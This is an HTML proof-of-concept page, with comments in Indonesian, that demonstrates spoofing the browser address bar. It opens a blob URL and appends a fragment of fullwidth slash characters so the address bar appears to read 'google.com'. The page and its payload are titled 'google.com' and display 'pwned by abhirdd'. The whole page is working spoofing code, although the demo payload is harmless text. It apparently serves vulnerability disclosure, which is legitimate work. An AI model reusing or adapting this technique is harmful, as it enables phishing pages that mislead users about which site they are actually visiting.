<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>google.com</title>
<style>
  body { margin:0; min-height:100vh; background:#fff; color:#000; font-family:Arial,Helvetica,sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:16px; }
  h1 { font-weight:normal; font-size:3rem; margin:0; }
  button { padding:10px 18px; font-size:0.9rem; cursor:pointer; border-radius:8px; border:1px solid #999; background:#f2f2f2; color:#000; }
  pre { font-size:0.7rem; color:#555; text-align:left; max-width:90vw; white-space:pre-wrap; }
</style>
</head>
<body>

  <h1>pwned by abhirdd</h1>
  <button id="go">Uji blob URL (address bar)</button>
  <pre id="log"></pre>

  <script>
    (function () {
      var logEl = document.getElementById('log');
      var log = function (m) { logEl.textContent += m + '\n'; console.log(m); };

      log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);

      // Fragment display-spoof (google.com + pwned) utk address bar.
      var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';

      // Teks "pwned by abhirdd" tampil LANGSUNG di halaman ini (bukan di
      // balik blob), jadi SELALU muncul walau navigasi blob gagal sekalipun.

      document.getElementById('go').onclick = function () {
        var payload =
          '<!DOCTYPE html><html><head><meta charset="utf-8"><title>google.com</title></head>' +
          '<body style="margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;color:#000;font-family:Arial;">' +
          '<h1 style="font-weight:normal;font-size:3rem;">pwned by abhirdd</h1></body></html>';
        var u = URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
        log('[main] target: ' + u + FRAGMENT);
        location.replace(u + FRAGMENT);
      };
    })();
  </script>

</body>
</html>
